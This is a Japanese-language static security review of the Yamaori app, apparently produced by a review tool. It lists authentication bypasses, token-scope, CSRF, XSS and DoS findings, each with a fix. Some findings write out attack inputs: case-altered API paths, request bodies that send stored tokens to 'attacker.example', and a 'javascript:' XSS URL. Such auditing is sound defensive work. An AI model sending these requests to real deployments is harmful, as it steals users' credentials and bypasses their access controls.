## レビュー結果

読み取り専用の静的レビューです。ファイル変更・ビルド・テスト実行はしていません。重要度順に、緊急 1件、高 3件、中 6件、低/要確認 2件です。

### 1. 緊急 — パスの大文字小文字を変えると認証を迂回できる

- ファイル: [Auth.cs:26–40](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:26)、[Server.cs:68–73](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Server.cs:68)
- 何が起きるか: 認証ミドルウェアは `Ordinal` で `/api/`、`/openapi`、`/mcp` を判定します。一方、ASP.NET Core のリテラル経路は通常大文字小文字を区別しません。LANから認証なしで `GET /API/days`、`GET /OpenApi/v1.json`、`POST /Api/settings/shutdown` のように送ると、ミドルウェアは「静的ファイル」とみなして通し、実際のAPIエンドポイントには一致します。`Origin` を付けないcurl等なら書き込みも可能です。REST、SSE、OpenAPI、MCP、設定、トークン発行、写真取得をまとめて迂回できます。
- 直し方: パス文字列で「APIなら保護」と分類せず、原則すべて拒否し、静的ファイルと `/api/auth/state`・`login` だけ明示的に匿名許可してください。最低限でも `PathString.StartsWithSegments` と大文字小文字を区別しない比較を使います。`/API/days`、`/Api/stream`、`/MCP`、`/OPENAPI/v1.json` の統合テストを追加してください。

### 2. 高 — 拡張機能用を含むBearerトークンが管理者権限を持つ

- ファイル: [Access.cs:46–51](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Core/Access.cs:46)、[Auth.cs:158–228](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:158)、[background.js:4–10](/home/mooma-0750/Documents/git-cloned/yamaori/extension/background.js:4)
- 何が起きるか: どのAPIトークンもセッションCookieと同じ権限です。拡張機能に入れたトークンが漏れると、攻撃者は新しい永続トークンの作成、認証設定変更、写真フォルダ変更、親への接続試験、再起動・終了まで実行できます。例えば `POST /api/auth/tokens` で別トークンを残せるため、元のトークンだけ失効してもアクセスが残ります。写真設定を変更して再起動すれば、任意の写真フォルダを目録に入れて取得したり、`after_upload` により元ファイルを削除させたりできます。
- 直し方: トークンにスコープを持たせてください。例として、拡張機能は `status`・world details・friends snapshot・missing detailsのみ、子端末はsyncのみ、一般クライアントはread/write、認証・設定・終了・再起動は管理セッションだけにします。トークン作成時に用途を選び、DBにもスコープを保存します。

### 3. 高 — 接続試験で保存済みの秘密を別ホストへ送信できる

- ファイル: [Auth.cs:267–276](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:267)、[Auth.cs:323–332](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:323)
- 何が起きるか:
  - `POST /api/settings/sync/test` に `{"parentUrl":"https://attacker.example"}` を渡し、`parentToken` を省略すると、保存済みの親トークンを攻撃者のホストへBearerで送ります。
  - `POST /api/settings/photos/test` に `{"kind":"webdav","target":"https://attacker.example/"}` を渡し、ユーザー名・パスワードを省略すると、保存済みのWebDAV資格情報でHEADします。SFTPでも保存済み資格情報を攻撃者のサーバーへ試します。
  - 問題2により、拡張機能用トークンでも実行できます。
- 直し方: リクエストで接続先または種類を上書きした場合、保存済み資格情報を絶対に補完しないでください。保存済み資格情報を使えるのは、正規化した接続先と種類が現在設定と完全一致するときだけにします。HTTP(S)のリダイレクト時にも認証ヘッダーを転送しないことを試験してください。

### 4. 高 — ログイン試行を並列化するとPBKDF2によるCPU DoSになる

- ファイル: [Auth.cs:125–136](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:125)、[AuthStore.cs:55–65](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Store/AuthStore.cs:55)
- 何が起きるか: 回数制限はパスワード検証が終わった後で失敗を数えます。多数の要求を同時に開始すると、全要求がロック確認を通過し、それぞれ60万回のPBKDF2を実行します。また31回失敗させれば、全利用者のログインを5分停止でき、繰り返し可能です。生の `X-Forwarded-For` をキーに含めるため、辞書にも不要なキーを増やせます。
- 直し方: ASP.NET CoreのRate Limiter等をパスワード検証より前に置き、全体の同時PBKDF2数を小さなSemaphoreで制限してください。ログイン本文とパスワード長にも小さい上限を設けます。転送ヘッダーは信頼済みプロキシから来た場合だけ使い、失敗辞書を期限付きで掃除してください。全員を止める固定ロックより、全体トークンバケットと接続元別制限が適します。

### 5. 中 — 動画URLがクリック時XSSになり得る（要確認）

- ファイル: [LineParser.cs:27–28](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Core/Log/LineParser.cs:27)、[Visit.svelte:84–90](/home/mooma-0750/Documents/git-cloned/yamaori/web/src/pages/Visit.svelte:84)
- 何が起きるか: ログの動画URLは任意文字列として保存され、そのまま `href` に入ります。例えばログまたは取り込みデータに `javascript:fetch('/api/auth/tokens')...` が入ると、ユーザーがリンクを押した際にJavaScript URLとして評価され得ます。Svelteはこの動的`href`を無加工で出力し、CSPもありません。JavaScript URLはナビゲーション先で実行可能です。[HTML Standard](https://html.spec.whatwg.org/multipage/browsing-the-web.html#the-javascript:-url-special-case)
- 要確認: VRChat側が `javascript:` 等を動画URLとしてログへ出すところまで許すかは未確認です。VRCX等の取り込み経由でも同じ表示経路になります。
- 直し方: 表示前にURLを解析し、リンクにするのは `http:`・`https:` だけにしてください。それ以外はテキスト表示にします。併せて `script-src 'self'; object-src 'none'; base-uri 'none'` 等のCSPを付けます。

### 6. 中 — Origin比較がポートを無視し、同じホスト上の別サービスからCSRFできる

- ファイル: [Access.cs:44–49](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Core/Access.cs:44)、[Access.cs:74–75](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Core/Access.cs:74)
- 何が起きるか: `Origin` と要求先をホスト名だけで比較しています。悪意あるローカルWebサービス `http://localhost:3000` から、フォームで `POST http://localhost:47800/api/settings/shutdown` を送ると、`Origin` のホストは同じ `localhost` なので通り、Yamaoriが終了します。Cookieもポートでは分離されません。再起動・ログアウトも同様です。
- 直し方: scheme・host・portを含む完全なoriginで比較してください。リバースプロキシ利用時は、信頼済みプロキシからのForwarded情報で外部originを構成するか、許可originを設定として持たせます。

### 7. 中 — PWA共有のGETリンクが同一オリジンの書き込みガジェットになる

- ファイル: [manifest.webmanifest:15–18](/home/mooma-0750/Documents/git-cloned/yamaori/web/public/manifest.webmanifest:15)、[App.svelte:19–22](/home/mooma-0750/Documents/git-cloned/yamaori/web/src/App.svelte:19)、[Share.svelte:12–15](/home/mooma-0750/Documents/git-cloned/yamaori/web/src/pages/Share.svelte:12)
- 何が起きるか: 被害者が  
  `http://localhost:47800/?title=偽名&text=wrld_11111111-1111-1111-1111-111111111111`  
  を開くだけで、ページ内JavaScriptが同一オリジンから `/api/worlds/save` を自動POSTします。外部サイトからの直接POSTはOrigin検査で止まりますが、この遷移で同一オリジンに「持ち替え」られます。既定のローカル無認証でも、ログイン済み構成でも成立します。
- 直し方: 共有内容を表示した後、明示的な「保存」操作を要求してください。自動保存を残す場合は、OSの共有起動と一般リンクを区別できる専用経路・ワンタイム値が必要です。

### 8. 中 — 設定APIが再起動不能・全ディスク走査などの値を受け入れる

- ファイル: [Auth.cs:185–203](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:185)、[Auth.cs:251–264](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:251)、[Auth.cs:292–311](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:292)、[PhotoWatcher.cs:18–25](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/PhotoWatcher.cs:18)
- 何が起きるか:
  - `port:-1` や `70000` は保存され、次回起動に失敗します。
  - `parentUrl` は任意の絶対URIを受け入れ、HTTP(S)以外や不正な実用値でSyncWorkerを停止させ得ます。
  - WebDAV/SFTPのtargetは保存時に構文検査されず、再起動後のバックグラウンドサービスで未処理例外になり得ます。
  - 非常に大きな間隔は`TimeSpan`変換でオーバーフローし得ます。
  - `photoDirs` にドライブのルート等を指定すると、全サブディレクトリを再帰走査し、見つけた写真をWeb APIから取得可能にします。
- 直し方: portを1–65535、間隔を有限の現実的範囲に制限し、URLのschemeと構文を保存時に検証してください。写真フォルダは正規化し、ルート指定・DataDir・システム領域を警告または拒否します。設定変更は管理セッションと再認証を要求するのが安全です。

### 9. 中 — 入力件数・文字列長と全件応答にアプリ側上限がない

- ファイル: [Api.cs:80–105](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Api.cs:80)、[Api.cs:110–130](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Api.cs:110)、[Queries.cs:123–145](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Store/Queries.cs:123)、[Api.cs:158–161](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Api.cs:158)
- 何が起きるか: HTTPサーバー既定の本文上限まではあるものの、アプリ側の件数・文字数制限がありません。巨大なfriends snapshot、sync projection、sync notes、Markdown本文、説明、タグを繰り返し投入できます。`/api/days` は全訪問と全encounterをメモリへ読み、Markdown書き出しは全日分を一つの文字列に結合します。DB肥大化、長時間トランザクション、メモリ枯渇、WebUIのMarkdown処理停止につながります。
- 直し方: エンドポイント別の本文上限、配列件数、ID・名前・説明・メモの長さを設けてください。syncは圧縮前後のサイズと要素数を検査します。daysはSQL集計またはページング、Markdown書き出しはストリーミング応答にします。

### 10. 中・要確認 — Tailscale本人ヘッダーを任意のloopbackプロキシから信頼する

- ファイル: [Auth.cs:52–63](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori/Web/Auth.cs:52)、[Access.cs:53–58](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Core/Access.cs:53)
- 何が起きるか: 接続元がloopbackなら、`Tailscale-User-Login` を署名や信頼済みプロキシ判定なしで信用します。別のローカルリバースプロキシがLANからの同名ヘッダーをそのまま転送すると、許可済みログイン名を指定するだけで認証を通過します。`local_requires_login` も、ローカルプロセスがこのヘッダーを付ければ迂回できます。
- 要確認: Kestrelのloopbackポートへ到達するプロキシが `tailscale serve` だけである運用なら、外部からの実害は限定的です。
- 直し方: Tailscale専用の待受または信頼済みプロキシの識別を設け、そこから来た要求だけヘッダーを使ってください。一般の転送ヘッダーを手作業で信頼せず、KnownProxies/KnownNetworksを設定したForwarded Headers Middlewareを使います。

### 11. 低・要確認 — vrchat.comページが拡張機能へ偽の応答を注入できる

- ファイル: [hook.js:7–11](/home/mooma-0750/Documents/git-cloned/yamaori/extension/hook.js:7)、[content.js:20–36](/home/mooma-0750/Documents/git-cloned/yamaori/extension/content.js:20)、[background.js:40–42](/home/mooma-0750/Documents/git-cloned/yamaori/extension/background.js:40)
- 何が起きるか: ページ側スクリプトは `source: "yamaori-hook"` の`window.postMessage`を自由に作れます。自動保存が有効なら偽のワールド情報やフレンド一覧をYamaoriへ送れます。さらに`captured`は通常のタブでも件数制限なく蓄積され、偽メッセージを大量に送ると拡張機能のメモリを圧迫できます。
- 要確認: vrchat.com本体と同一オリジンのスクリプトを信頼対象とする設計なら、主なリスクはサイト侵害・第三者スクリプト侵害時に限られます。
- 直し方: 受信データを完全に未信頼として、URLのorigin、ID書式、配列件数、各文字列長を検査してください。background側は自分が開いたbulk用tab IDだけ`captured`を保存し、タブ終了時と上限超過時に破棄します。

### 12. 低・要確認 — 外部サムネイルURLで閲覧者を追跡できる

- ファイル: [ExtensionStore.cs:27–41](/home/mooma-0750/Documents/git-cloned/yamaori/src/Yamaori.Store/ExtensionStore.cs:27)、[World.svelte:60–62](/home/mooma-0750/Documents/git-cloned/yamaori/web/src/pages/World.svelte:60)
- 何が起きるか: `thumbnailUrl` は任意URLとして保存され、ワールド画面を開くとブラウザが直接取得します。偽の拡張機能メッセージやトークン経由で一意な攻撃者URLを保存すると、閲覧時刻と接続元IPを通知できます。`referrerpolicy="no-referrer"` によりYamaoriのURL自体は漏れません。
- 要確認: 実際のVRChat APIが常に管理されたCDN URLだけを返すなら通常利用での可能性は低いです。
- 直し方: HTTPSかつ既知のVRChat CDNホストだけ許可するか、Yamaori側で取得・キャッシュして同一オリジンから配信してください。

## 問題が見つからなかった観点

- Markdownは`marked`後にDOMPurifyを通してから`{@html}`へ渡しており、メモ本文の直接XSSは見つかりませんでした。
- ワールド説明、表示名、通知文などは通常のSvelte補間で表示され、HTMLとして解釈されません。
- 写真本体はDBの`photo_locations`に実在するパスだけを返し、HTTP入力を直接ファイルパスへ変換していません。
- 縮小画像のIDは通常は固定長ハッシュで、書き出しファイル名も日付から生成されます。通常データで成立するパストラバーサルは見つかりませんでした。
- パスワードはPBKDF2-SHA256、セッションとAPIトークンはランダム値のSHA-256だけをDBへ保存しており、平文保存はありません。
- セッションCookieはHttpOnly・SameSite=Strictで、パスワード変更時に既存セッションを削除しています。
- 拡張機能の自動ワールド保存、自動フレンド記録、まとめて取得はすべて既定で無効でした。
- 拡張機能のトークンは`chrome.storage.local`からbackground内で使われ、ページへ直接渡す経路は見つかりませんでした。
- SSEの各購読キューは256件に制限され、遅い購読者によるイベントの無限蓄積は防がれています。
- SQL値は確認した範囲でパラメーター化され、外部文字列によるSQLインジェクションは見つかりませんでした。
- 静的ファイルは意図どおり匿名配信されますが、記録そのものやソースマップは含まれていません。OpenAPI・SSE・MCPも、問題1の大文字小文字迂回を除けば認証ミドルウェアの後ろに配置されています。